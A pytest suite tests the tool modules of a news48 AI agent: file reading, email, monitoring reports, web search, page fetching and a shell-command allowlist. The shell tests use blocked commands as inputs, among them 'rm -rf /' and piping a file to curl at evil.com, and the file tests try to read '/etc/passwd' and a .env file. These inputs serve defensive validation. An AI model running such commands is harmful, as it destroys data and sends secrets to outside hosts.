"""Comprehensive tests for all agent tool modules.

Covers: _helpers, files, email, sentinel, system, searxng, bypass, shell.
Each tool is tested for correct behavior, validation, error handling,
and edge cases. External dependencies (SMTP, HTTP, filesystem) are mocked.
"""

import json
import os
import stat
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# ---------------------------------------------------------------------------
# _helpers module
# ---------------------------------------------------------------------------


class TestIsBinary:
    """Test _is_binary detection."""

    def test_null_byte_is_binary(self):
        from news48.core.agents.tools._helpers import _is_binary

        assert _is_binary(b"hello\x00world") is True

    def test_text_is_not_binary(self):
        from news48.core.agents.tools._helpers import _is_binary

        assert _is_binary(b"Hello, this is plain text.") is False

    def test_empty_sample_is_not_binary(self):
        from news48.core.agents.tools._helpers import _is_binary

        assert _is_binary(b"") is False

    def test_high_non_printable_ratio_is_binary(self):
        from news48.core.agents.tools._helpers import _is_binary

        # More than 30% non-printable bytes
        sample = bytes(range(256)) * 20
        assert _is_binary(sample) is True

    def test_mostly_printable_is_not_binary(self):
        from news48.core.agents.tools._helpers import _is_binary

        sample = b"abcdefghijklmnopqrstuvwxyz " * 100
        assert _is_binary(sample) is False


class TestCleanText:
    """Test _clean_text search result cleaning."""

    def test_strips_html_tags(self):
        from news48.core.agents.tools._helpers import _clean_text

        assert "<b>" not in _clean_text("<b>Bold</b> text")

    def test_collapses_whitespace(self):
        from news48.core.agents.tools._helpers import _clean_text

        result = _clean_text("hello   world")
        assert "   " not in result

    def test_empty_string(self):
        from news48.core.agents.tools._helpers import _clean_text

        assert _clean_text("") == ""

    def test_removes_social_metrics(self):
        from news48.core.agents.tools._helpers import _clean_text

        result = _clean_text("237.5M Followers")
        assert "Followers" not in result

    def test_removes_relative_time_prefix(self):
        from news48.core.agents.tools._helpers import _clean_text

        result = _clean_text("3 days ago · Actual content")
        assert "days ago" not in result


class TestSafeJson:
    """Test _safe_json serialization."""

    def test_returns_valid_json(self):
        from news48.core.agents.tools._helpers import _safe_json

        result = _safe_json({"key": "value"})
        parsed = json.loads(result)
        assert parsed["key"] == "value"

    def test_handles_non_ascii(self):
        from news48.core.agents.tools._helpers import _safe_json

        result = _safe_json({"key": "Ünïcödé"})
        parsed = json.loads(result)
        assert parsed["key"] == "Ünïcödé"

    def test_handles_serialization_error(self):
        from news48.core.agents.tools._helpers import _safe_json

        # Object that can't be serialized
        result = _safe_json({"key": object()})
        parsed = json.loads(result)
        assert "error" in parsed

    def test_indent_none(self):
        from news48.core.agents.tools._helpers import _safe_json

        result = _safe_json({"a": 1}, indent=None)
        assert "\n" not in result


# ---------------------------------------------------------------------------
# files module
# ---------------------------------------------------------------------------


class TestReadFile:
    """Test read_file tool."""

    def test_full_read(self, tmp_path):
        from news48.core.agents.tools.files import read_file

        test_file = tmp_path / "test.txt"
        test_file.write_text("line1\nline2\nline3\n", encoding="utf-8")

        with patch("news48.core.agents.tools.files._ALLOWED_ROOTS", [tmp_path]):
            result = json.loads(read_file(reason="test", file_path=str(test_file)))

        assert result["error"] == ""
        assert "line1" in result["result"]["content"]
        assert result["result"]["line_count"] == 4  # 3 newlines + 1

    def test_chunk_read(self, tmp_path):
        from news48.core.agents.tools.files import read_file

        test_file = tmp_path / "test.txt"
        test_file.write_text("line0\nline1\nline2\nline3\nline4\n", encoding="utf-8")

        with patch("news48.core.agents.tools.files._ALLOWED_ROOTS", [tmp_path]):
            result = json.loads(
                read_file(
                    reason="test",
                    file_path=str(test_file),
                    offset=1,
                    limit=2,
                )
            )

        assert result["error"] == ""
        assert result["result"]["offset"] == 1
        assert result["result"]["lines"] == 2
        assert "line1" in result["result"]["content"]

    def test_metadata_only(self, tmp_path):
        from news48.core.agents.tools.files import read_file

        test_file = tmp_path / "test.txt"
        test_file.write_text("content", encoding="utf-8")

        with patch("news48.core.agents.tools.files._ALLOWED_ROOTS", [tmp_path]):
            result = json.loads(
                read_file(reason="test", file_path=str(test_file), metadata_only=True)
            )

        assert result["error"] == ""
        assert result["result"]["is_file"] is True
        assert result["result"]["size_bytes"] > 0

    def test_file_not_found(self, tmp_path):
        from news48.core.agents.tools.files import read_file

        with patch("news48.core.agents.tools.files._ALLOWED_ROOTS", [tmp_path]):
            result = json.loads(
                read_file(reason="test", file_path=str(tmp_path / "nope.txt"))
            )

        assert "not found" in result["error"].lower()

    def test_binary_file_rejected(self, tmp_path):
        from news48.core.agents.tools.files import read_file

        test_file = tmp_path / "test.bin"
        test_file.write_bytes(b"\x00\x01\x02\x03" * 100)

        with patch("news48.core.agents.tools.files._ALLOWED_ROOTS", [tmp_path]):
            result = json.loads(read_file(reason="test", file_path=str(test_file)))

        assert "binary" in result["error"].lower()

    def test_path_outside_allowed_roots_blocked(self, tmp_path):
        from news48.core.agents.tools.files import read_file

        result = json.loads(read_file(reason="test", file_path="/etc/passwd"))
        assert "access denied" in result["error"].lower()

    def test_sensitive_file_blocked(self, tmp_path):
        from news48.core.agents.tools.files import read_file

        env_file = tmp_path / ".env"
        env_file.write_text("SECRET=123", encoding="utf-8")

        with patch("news48.core.agents.tools.files._ALLOWED_ROOTS", [tmp_path]):
            result = json.loads(read_file(reason="test", file_path=str(env_file)))

        assert "access denied" in result["error"].lower()

    def test_directory_as_file_returns_error(self, tmp_path):
        from news48.core.agents.tools.files import read_file

        with patch("news48.core.agents.tools.files._ALLOWED_ROOTS", [tmp_path]):
            result = json.loads(read_file(reason="test", file_path=str(tmp_path)))

        # Reading a directory should fail (it's not a regular file for full read)
        assert result["error"] != "" or result["result"] != ""


# ---------------------------------------------------------------------------
# email module
# ---------------------------------------------------------------------------


class TestSendEmail:
    """Test send_email tool."""

    def test_missing_smtp_host(self):
        from news48.core.agents.tools.email import send_email

        with patch.dict(os.environ, {}, clear=False):
            # Ensure SMTP_HOST is not set
            env = {k: v for k, v in os.environ.items() if k != "SMTP_HOST"}
            with patch.dict(os.environ, env, clear=True):
                result = json.loads(
                    send_email(reason="test", to="a@b.com", subject="Hi", body="Body")
                )
                assert "SMTP_HOST" in result["error"]

    def test_missing_smtp_user(self):
        from news48.core.agents.tools.email import send_email

        env = {"SMTP_HOST": "smtp.example.com"}
        with patch.dict(os.environ, env, clear=True):
            result = json.loads(
                send_email(reason="test", to="a@b.com", subject="Hi", body="Body")
            )
            assert "SMTP_USER" in result["error"]

    def test_missing_recipient(self):
        from news48.core.agents.tools.email import send_email

        env = {
            "SMTP_HOST": "smtp.example.com",
            "SMTP_USER": "user",
            "SMTP_PASS": "pass",
        }
        with patch.dict(os.environ, env, clear=True):
            result = json.loads(send_email(reason="test", subject="Hi", body="Body"))
            assert "recipient" in result["error"].lower()

    def test_missing_subject(self):
        from news48.core.agents.tools.email import send_email

        env = {
            "SMTP_HOST": "smtp.example.com",
            "SMTP_USER": "user",
            "SMTP_PASS": "pass",
            "MONITOR_EMAIL_TO": "a@b.com",
        }
        with patch.dict(os.environ, env, clear=True):
            result = json.loads(send_email(reason="test", body="Body"))
            assert "subject" in result["error"].lower()

    def test_missing_body(self):
        from news48.core.agents.tools.email import send_email

        env = {
            "SMTP_HOST": "smtp.example.com",
            "SMTP_USER": "user",
            "SMTP_PASS": "pass",
            "MONITOR_EMAIL_TO": "a@b.com",
        }
        with patch.dict(os.environ, env, clear=True):
            result = json.loads(send_email(reason="test", subject="Hi"))
            assert "body" in result["error"].lower()

    def test_successful_send(self):
        from news48.core.agents.tools.email import send_email

        env = {
            "SMTP_HOST": "smtp.example.com",
            "SMTP_USER": "user",
            "SMTP_PASS": "pass",
            "MONITOR_EMAIL_TO": "a@b.com",
        }
        with patch.dict(os.environ, env, clear=True):
            with patch("news48.core.agents.tools.email.smtplib.SMTP") as mock_smtp:
                mock_server = MagicMock()
                mock_smtp.return_value.__enter__ = lambda s: mock_server
                mock_smtp.return_value.__exit__ = MagicMock(return_value=False)
                result = json.loads(
                    send_email(
                        reason="test",
                        to="a@b.com",
                        subject="Alert",
                        body="Something happened",
                    )
                )
                assert result["result"] == "sent"
                assert result["error"] == ""


# ---------------------------------------------------------------------------
# sentinel module
# ---------------------------------------------------------------------------


class TestWriteSentinelReport:
    """Test write_sentinel_report tool."""

    def test_writes_valid_report(self, tmp_path, monkeypatch):
        from news48.core import config
        from news48.core.agents.tools.sentinel import write_sentinel_report

        monkeypatch.setattr(config, "MONITOR_DIR", tmp_path / "monitor")

        result = json.loads(
            write_sentinel_report(
                status="HEALTHY",
                metrics=json.dumps({"feeds_total": 40}),
                alerts=json.dumps([]),
                recommendations=json.dumps([]),
            )
        )

        assert result["error"] == ""
        assert "Report written" in result["result"]

        report_path = tmp_path / "monitor" / "latest-report.json"
        assert report_path.exists()
        report = json.loads(report_path.read_text())
        assert report["status"] == "HEALTHY"
        assert report["metrics"]["feeds_total"] == 40

    def test_invalid_status_defaults_to_healthy(self, tmp_path, monkeypatch):
        from news48.core import config
        from news48.core.agents.tools.sentinel import write_sentinel_report

        monkeypatch.setattr(config, "MONITOR_DIR", tmp_path / "monitor")

        result = json.loads(
            write_sentinel_report(
                status="INVALID",
                metrics="{}",
                alerts="[]",
                recommendations="[]",
            )
        )

        assert result["error"] == ""
        report_path = tmp_path / "monitor" / "latest-report.json"
        report = json.loads(report_path.read_text())
        assert report["status"] == "HEALTHY"

    def test_invalid_json_metrics_falls_back_to_raw(self, tmp_path, monkeypatch):
        from news48.core import config
        from news48.core.agents.tools.sentinel import write_sentinel_report

        monkeypatch.setattr(config, "MONITOR_DIR", tmp_path / "monitor")

        result = json.loads(
            write_sentinel_report(
                status="WARNING",
                metrics="not json",
                alerts="[]",
                recommendations="[]",
            )
        )

        assert result["error"] == ""
        report_path = tmp_path / "monitor" / "latest-report.json"
        report = json.loads(report_path.read_text())
        assert report["metrics"]["raw"] == "not json"

    def test_critical_status_preserved(self, tmp_path, monkeypatch):
        from news48.core import config
        from news48.core.agents.tools.sentinel import write_sentinel_report

        monkeypatch.setattr(config, "MONITOR_DIR", tmp_path / "monitor")

        result = json.loads(
            write_sentinel_report(
                status="critical",
                metrics=json.dumps({"download_backlog": 100}),
                alerts=json.dumps(["Backlog too high"]),
                recommendations=json.dumps(["Run download"]),
            )
        )

        assert result["error"] == ""
        report_path = tmp_path / "monitor" / "latest-report.json"
        report = json.loads(report_path.read_text())
        assert report["status"] == "CRITICAL"
        assert len(report["alerts"]) == 1
        assert len(report["recommendations"]) == 1


# ---------------------------------------------------------------------------
# system module
# ---------------------------------------------------------------------------


class TestGetSystemInfo:
    """Test get_system_info tool."""

    def test_returns_expected_keys(self):
        from news48.core.agents.tools.system import get_system_info

        result = json.loads(get_system_info())
        assert result["error"] == ""
        info = result["result"]

        expected_keys = [
            "working_directory",
            "python_executable",
            "python_version",
            "platform",
            "platform_release",
            "default_shell",
            "home_directory",
            "current_datetime",
            "local_datetime",
            "architecture",
            "news48",
        ]
        for key in expected_keys:
            assert key in info, f"Missing key: {key}"

    def test_news48_section_has_expected_fields(self):
        from news48.core.agents.tools.system import get_system_info

        result = json.loads(get_system_info())
        news48_info = result["result"]["news48"]

        expected_fields = [
            "database_url",
            "database_connected",
            "database_size_mb",
            "env_configured",
            "byparr_configured",
            "searxng_configured",
            "api_base_configured",
        ]
        for field in expected_fields:
            assert field in news48_info, f"Missing news48 field: {field}"

    def test_python_version_is_string(self):
        from news48.core.agents.tools.system import get_system_info

        result = json.loads(get_system_info())
        assert isinstance(result["result"]["python_version"], str)

    def test_datetime_fields_are_iso_format(self):
        from news48.core.agents.tools.system import get_system_info

        result = json.loads(get_system_info())
        # Should be parseable ISO format strings
        assert "T" in result["result"]["current_datetime"]
        assert "T" in result["result"]["local_datetime"]


# ---------------------------------------------------------------------------
# searxng module
# ---------------------------------------------------------------------------


class TestPerformWebSearch:
    """Test perform_web_search tool."""

    def test_raises_without_searxng_url(self):
        from news48.core.agents.tools import searxng

        with patch.object(searxng, "SEARXNG_URL", ""):
            with pytest.raises(ValueError, match="SEARXNG_URL"):
                searxng.perform_web_search(reason="test", query="hello")

    def test_raises_on_empty_query(self):
        from news48.core.agents.tools import searxng

        with patch.object(searxng, "SEARXNG_URL", "http://localhost:8888"):
            with pytest.raises(ValueError, match="query"):
                searxng.perform_web_search(reason="test", query="")

    def test_raises_on_invalid_pages(self):
        from news48.core.agents.tools import searxng

        with patch.object(searxng, "SEARXNG_URL", "http://localhost:8888"):
            with pytest.raises(ValueError, match="pages"):
                searxng.perform_web_search(reason="test", query="hello", pages=0)

    def test_successful_search_returns_results(self):
        from news48.core.agents.tools import searxng

        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            "results": [
                {
                    "url": "https://example.com/1",
                    "title": "Test Result",
                    "content": "Some content about the topic",
                }
            ]
        }
        mock_response.raise_for_status = MagicMock()

        with patch.object(searxng, "SEARXNG_URL", "http://localhost:8888"):
            with patch("httpx.Client") as mock_client_cls:
                mock_client = MagicMock()
                mock_client.get.return_value = mock_response
                mock_client_cls.return_value.__enter__ = lambda s: mock_client
                mock_client_cls.return_value.__exit__ = MagicMock(return_value=False)

                result = json.loads(
                    searxng.perform_web_search(
                        reason="test", query="test query", pages=1
                    )
                )

                assert result["error"] == ""
                assert result["result"]["count"] == 1
                assert result["result"]["findings"][0]["url"] == "https://example.com/1"

    def test_partial_failure_returns_error(self):
        import httpx

        from news48.core.agents.tools import searxng

        with patch.object(searxng, "SEARXNG_URL", "http://localhost:8888"):
            with patch("httpx.Client") as mock_client_cls:
                mock_client = MagicMock()
                mock_client.get.side_effect = httpx.HTTPError("Connection refused")
                mock_client_cls.return_value.__enter__ = lambda s: mock_client
                mock_client_cls.return_value.__exit__ = MagicMock(return_value=False)

                result = json.loads(
                    searxng.perform_web_search(reason="test", query="test", pages=1)
                )

                assert result["result"]["count"] == 0
                assert result["error"] != ""
                assert result["result"]["page_stats"]["failed"] == 1


# ---------------------------------------------------------------------------
# bypass module
# ---------------------------------------------------------------------------


class TestFetchWebpageContent:
    """Test fetch_webpage_content tool."""

    @pytest.mark.anyio
    async def test_rejects_private_ip(self):
        from news48.core.agents.tools.bypass import fetch_webpage_content

        result = json.loads(
            await fetch_webpage_content(reason="test", urls=["http://127.0.0.1/secret"])
        )

        assert len(result["result"]["errors"]) == 1
        assert (
            "private" in result["result"]["errors"][0]["error"].lower()
            or "denied" in result["result"]["errors"][0]["error"].lower()
            or "ssrf" in result["result"]["errors"][0]["error"].lower()
            or result["result"]["succeeded"] == 0
        )

    @pytest.mark.anyio
    async def test_empty_url_list(self):
        from news48.core.agents.tools.bypass import fetch_webpage_content

        result = json.loads(await fetch_webpage_content(reason="test", urls=[]))

        assert result["result"]["requested"] == 0
        assert result["result"]["succeeded"] == 0

    @pytest.mark.anyio
    async def test_successful_fetch_with_mock(self):
        from news48.core.agents.tools.bypass import fetch_webpage_content

        with (
            patch("news48.core.agents.tools.bypass.validate_url_not_private"),
            patch(
                "news48.core.agents.tools.bypass.get_base_url",
                return_value="example.com",
            ),
            patch(
                "news48.core.agents.tools.bypass.get_byparr_solution",
                new_callable=AsyncMock,
                return_value=MagicMock(),
            ),
            patch(
                "news48.core.agents.tools.bypass.fetch_url_content",
                new_callable=AsyncMock,
                return_value="<p>Hello world</p>",
            ),
            patch(
                "news48.core.agents.tools.bypass.convert",
                return_value={"content": "Hello world"},
            ),
        ):
            result = json.loads(
                await fetch_webpage_content(
                    reason="test",
                    urls=["https://example.com/page"],
                    markdown=True,
                )
            )

            assert result["result"]["succeeded"] == 1
            assert result["result"]["errors"] == []
            assert result["result"]["results"][0]["content"] == "Hello world"


# ---------------------------------------------------------------------------
# shell module — _validate_command
# ---------------------------------------------------------------------------


class TestValidateCommand:
    """Test shell command validation."""

    def test_empty_command_blocked(self):
        from news48.core.agents.tools.shell import _validate_command

        assert _validate_command("") is not None
        assert _validate_command("   ") is not None

    def test_news48_allowed(self):
        from news48.core.agents.tools.shell import _validate_command

        assert _validate_command("news48 stats --json") is None

    def test_allowed_base_commands(self):
        from news48.core.agents.tools.shell import _validate_command

        for cmd in [
            "ls -la",
            "cat file.txt",
            "head -n 5 file",
            "grep pattern file",
        ]:
            assert _validate_command(cmd) is None, f"Should allow: {cmd}"

    def test_blocked_curl(self):
        from news48.core.agents.tools.shell import _validate_command

        result = _validate_command("curl http://example.com")
        assert result is not None
        assert "blocked" in result.lower()

    def test_blocked_python(self):
        from news48.core.agents.tools.shell import _validate_command

        result = _validate_command("python -c 'print(1)'")
        assert result is not None

    def test_blocked_sudo(self):
        from news48.core.agents.tools.shell import _validate_command

        result = _validate_command("sudo ls")
        assert result is not None

    def test_blocked_rm(self):
        from news48.core.agents.tools.shell import _validate_command

        result = _validate_command("rm -rf /")
        assert result is not None

    def test_blocked_git(self):
        from news48.core.agents.tools.shell import _validate_command

        result = _validate_command("git push origin main")
        assert result is not None

    def test_blocked_env_leakage(self):
        from news48.core.agents.tools.shell import _validate_command

        assert _validate_command("env") is not None
        assert _validate_command("printenv") is not None

    def test_blocked_pip(self):
        from news48.core.agents.tools.shell import _validate_command

        result = _validate_command("pip install requests")
        assert result is not None

    def test_blocked_wget(self):
        from news48.core.agents.tools.shell import _validate_command

        result = _validate_command("wget http://example.com")
        assert result is not None

    def test_blocked_pattern_after_pipe(self):
        from news48.core.agents.tools.shell import _validate_command

        result = _validate_command("cat file | curl http://evil.com")
        assert result is not None

    def test_unlisted_command_blocked(self):
        from news48.core.agents.tools.shell import _validate_command

        result = _validate_command("docker ps")
        assert result is not None
        assert "not in the allowlist" in result

    def test_shell_builtins_allowed(self):
        from news48.core.agents.tools.shell import _validate_command

        for cmd in ["wait", "if true; then echo ok; fi", "test -f file"]:
            assert _validate_command(cmd) is None, f"Should allow: {cmd}"
